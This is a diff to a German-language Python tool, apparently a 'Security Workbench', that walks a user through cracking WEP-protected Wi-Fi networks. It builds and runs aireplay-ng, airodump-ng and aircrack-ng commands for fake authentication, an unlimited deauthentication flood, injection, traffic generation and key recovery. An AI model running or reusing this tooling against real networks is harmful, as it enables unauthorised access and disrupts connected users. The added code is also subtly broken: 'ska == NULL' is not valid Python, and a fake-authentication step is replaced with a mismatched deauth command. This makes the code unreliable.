@@ -1,5 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
+#! TODO WLAN Interface wird nicht reseted
 import os
 import sys
 import subprocess
@@ -13,7 +14,7 @@ from generics import rlinput,execute,clearScreen,showCAPfiles,showSKA
 
 def WEP_Shared(wifi_name,wifi_mac,router_ssid,router_bssid,router_chn):
 	print("Für das Knacken von WEP-Shared-gesicherten Netzen muss zuerst eine Deauthentication von AP vermieden werden.")
-	#START MONITOR-MODE
+	#START MONITOR-MODEPRESHAREDKEY
 	generics.monitor_mode(wifi_name)
 
 	#DELETE OLD SKA-FILES
@@ -26,7 +27,9 @@ def WEP_Shared(wifi_name,wifi_mac,router_ssid,router_bssid,router_chn):
 
 	#PERFORM SHARED KEY AUTHENTICATION
 	ska= showSKA('sharedkey')
-	command = rlinput('Durchführen einer Shared-Key-Fake-Authentication: \n# ', 'aireplay-ng -1 0 -e '+ router_ssid + ' -y ' + ska + ' -a ' + router_bssid + ' -h ' + wifi_mac + ' ' + wifi_name)
+	if (ska == NULL):
+		print("Wenn Kein sharedkey gefunden kann ein bug in airodump dafür verantwortlich sein: Einen Workaround kann man unter \"https://itfellover.com/6-shared-key-authentication-ska/\" finden  ")
+	command = rlinput('Durchführen einer Shared-Key-Fake-Authentication: \n# ', 'aireplay-ng --deauth 0 -e '+ router_ssid + ' -y ' + ska + ' -a ' + router_bssid + ' -h ' + wifi_mac + ' ' + wifi_name)
 	execute(command)
 
 	#STOP MONITOR MODE
@@ -125,15 +128,14 @@ def WEP_Open():
 			while(success!=True):
 				success=WEP_Shared(wifi_name,wifi_mac,router_ssid,router_bssid,router_chn)
 		
-		command = rlinput('Aufnahme des Netzwerkverkehrs (Im Hintergrund geöffnet lassen): \n# ', 'airodump-ng -c ' +router_chn + str5ghz +' -w ' + router_ssid + ' --bssid ' + router_bssid+ ' ' + wifi_name )
+		command = rlinput('Aufnahme des Netzwerkverkehrs (Im Hintergrund geöffnet lassen): \n# ', 'airodump-ng -c ' +router_chn + str5ghz +' -w ' + router_ssid + ' --bssid ' + router_bssid.replace(" ", "\s")+ ' ' + wifi_name )
 		execute(command)
-
 		#INJECTION TEST
-		command = rlinput('Überprüfung ob Netzwerk angreifbar ist. (Nach erfolgter Prüfung kann dieses Fenster geschlossen werden.): \n# ', 'aireplay-ng -9 -e ' +router_ssid +' -a ' + router_bssid +  ' ' + wifi_name )
+		command = rlinput('Überprüfung ob Netzwerk angreifbar ist. (Nach erfolgter Prüfung kann dieses Fenster geschlossen werden.): \n# ', 'aireplay-ng -9 -e ' +router_ssid +' -a ' + router_bssid.replace(" ", "\s") +  ' ' + wifi_name )
 		execute(command)
 
 		#SEND AUTH PACKETS
-		command = rlinput('Senden von authentication-Paketen, um mehr Netzwerkverkehr zu generieren (Im Hintergrund geöffnet lassen): \n# ', 'aireplay-ng -1 6 -o 1 -q 1 -e ' +router_ssid +' -a ' + router_bssid + ' -h ' + wifi_mac +' ' + wifi_name )
+		command = rlinput('Senden von authentication-Paketen, um mehr Netzwerkverkehr zu generieren (Im Hintergrund geöffnet lassen): \n# ', 'aireplay-ng -1 6 -o 1 -q 1 -e ' +router_ssid +' -a ' + router_bssid.replace(" ", "\s") + ' -h ' + wifi_mac +' ' + wifi_name )
 		execute(command)
 
 		#CAPTURE ARP-REQ
@@ -147,7 +149,7 @@ def WEP_Open():
 		#Show list of CAP-Files
 		filenamestring= showCAPfiles(router_ssid)
 
-		command = rlinput('Das WEP-Passwort kann nun mit Hilfe des aufgenommenen Verkehrs ermittelt werden. Wenn ein Key gefunden wurde wird dieser ausgegeben. Solange muss der Prozess weiter laufen: \n# ', 'aircrack-ng -b ' +router_bssid + ' ' + filenamestring )
+		command = rlinput('Das WEP-Passwort kann nun mit Hilfe des aufgenommenen Verkehrs ermittelt werden. Wenn ein Key gefunden wurde wird dieser ausgegeben. Solange muss der Prozess weiter laufen: \n# ', 'aircrack-ng -b ' +router_bssid.replace(" ", "\s") + ' ' + filenamestring )
 		execute(command)
 
 		#ReStart Networkmanager
@@ -175,7 +177,8 @@ def WEP_Open():
 
 def sql_signal_handler(signal, frame):
 	#ReStart Networkmanager
-	os.system("service network-manager restart")
+	os.system("service networking stop && service network-manager stop")
+	os.system("service networking start && service network-manager start")
 	print('\n\n Die Security Workbench wird beendet ... \n')
 	sys.exit(0)
 
